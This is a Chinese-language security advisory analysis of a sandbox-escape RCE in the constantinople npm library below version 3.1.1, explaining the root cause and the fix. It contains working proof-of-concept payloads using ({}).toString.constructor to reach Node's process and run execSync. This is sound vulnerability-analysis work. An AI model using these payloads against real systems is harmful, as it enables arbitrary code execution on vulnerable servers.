
https://github.com/advisories/GHSA-4vmm-mhcq-4x9j
https://github.com/pugjs/constantinople/commit/01d409c0d081dfd65223e6b7767c244156d35f7f

## 背景

- 受影响范围：`< 3.1.1`
- 关键修复提交：`01d409c0d081dfd65223e6b7767c244156d35f7f`
- 风险等级：高危（可导致任意代码执行，RCE）

这个库的目标是：判断一个表达式是否是“常量表达式”，并在是常量时把它求值出来。

漏洞的根因是：**旧版本把“是否安全”的判断和“实际执行”分离，并且执行阶段使用了动态代码执行（`Function(...)`）**。攻击者可以构造通过语法白名单的表达式，在执行阶段逃逸并拿到 Node.js 全局能力。

---

## 漏洞原理（旧实现）

旧版逻辑大致分两步：

1. `isConstant(src, constants)`：遍历 AST，做“节点类型白名单”检查
2. `toConstant(src, constants)`：如果上一步返回 true，则执行：

```js
Function(Object.keys(constants || {}).join(','), 'return (' + src + ')')
  .apply(null, Object.keys(constants || {}).map(function (key) {
    return constants[key];
  }));
```

### 为什么白名单挡不住

`isConstant` 只验证“语法形状”，例如允许：

- `CallExpression`
- `MemberExpression`（禁止下划线开头属性、禁止 computed）
- `ObjectExpression`
- `StringLiteral` 等

但是它**没有验证调用链的语义安全性**。例如下面这个表达式的语法形状完全合法：

```js
({}).toString.constructor("return process")()
```

这条链的语义是：

1. `({}).toString` -> 得到 `Object.prototype.toString` 函数
2. `.constructor` -> 得到 `Function` 构造器
3. `Function("return process")()` -> 访问 Node 全局 `process`

一旦拿到 `process`，就能继续访问模块加载与系统命令能力，演变为 RCE。

### 本质问题

- **检查层**：只做“语法白名单”，未做“可调用对象/属性语义白名单”
- **执行层**：使用 `Function` 直接执行用户表达式（动态求值）
- 两者叠加形成“看起来被限制，实际上可逃逸”的沙箱绕过

---

## PoC（仅用于安全验证）

> 以下 PoC 仅用于本地授权测试，勿用于未授权系统。

### PoC 1：验证可逃逸到 `process`

```js
const c = require('constantinople');

const payload = '({}).toString.constructor("return process")()';

console.log('isConstant =', c.isConstant(payload));
const p = c.toConstant(payload);
console.log('process.version =', p.version);
```

**预期（漏洞版本）**：

- `isConstant(payload)` 返回 `true`
- `toConstant(payload)` 返回 `process` 对象

---

### PoC 2：命令执行（RCE 证明）

```js
const c = require('constantinople');

const payload =
  '({}).toString.constructor("return process.mainModule.require(\\"child_process\\").execSync(\\"id\\").toString()")()';

console.log('isConstant =', c.isConstant(payload));
const out = c.toConstant(payload);
console.log('command output =', out);
```

**预期（漏洞版本）**：

- `isConstant(payload)` 返回 `true`
- `toConstant(payload)` 执行系统命令并返回输出

说明：不同 Node 版本里 `process.mainModule` 可能行为有差异，可改为其他可达链路；核心点是拿到 `Function` 后可执行任意 JS，再借 Node 全局能力进入系统命令执行。

---

## 修复原理对照（提交 `01d409c...`）

修复不是“补一个黑名单字符串”，而是**执行模型重构**。

### 1) 从“动态执行字符串”改为“AST 解释执行”

- 旧：`Function('return (' + src + ')')`（本质动态执行）
- 新：`expressionToConstant()` 对 AST 节点逐类求值

这意味着表达式不会被 JS 引擎当作完整源码再次编译执行，而是在受控解释器里按节点类型计算。

### 2) 对可调用方法做显式白名单（`canCallMethod`）

新实现里，`CallExpression` 的成员调用会检查：

- 基础类型只允许有限方法（如字符串的 `slice`、`indexOf` 等）
- 正则只允许 `test` / `exec`
- 普通对象也要满足严格条件

这直接切断了 `toString.constructor` 这类“函数构造器提权链”。

### 3) 对成员访问和对象属性更严格

- 禁止或限制下划线私有风格属性
- 对对象属性、展开、简写等场景做更严格常量性判断
- 一旦出现不可证明安全的节点，立即标记 `constant = false`

### 4) 回归测试补上攻击样例

修复提交里新增测试：

```js
({}).toString.constructor("console.log(1)")()
```

并要求 `isConstant(...) === false`，防止该绕过回归。

---

## 攻防视角总结

- 这类“表达式求值器”最容易犯的错误：
  - 仅做 AST 白名单
  - 最后仍回到 `eval/Function` 执行
- 正确方向：
  - 全程在受控解释器中计算
  - 对“可调用对象 + 可访问属性 + 调用副作用”建立语义白名单
  - 用回归测试锁住已知利用链

---

## 参考定位

- 修复提交：`01d409c0d081dfd65223e6b7767c244156d35f7f`
- 旧实现关键点：`index.js`（`toConstant` 使用 `Function(...)`）
- 新实现关键点：`src/index.ts`（`expressionToConstant` + `canCallMethod`）
- 对应测试：`test/index.js`
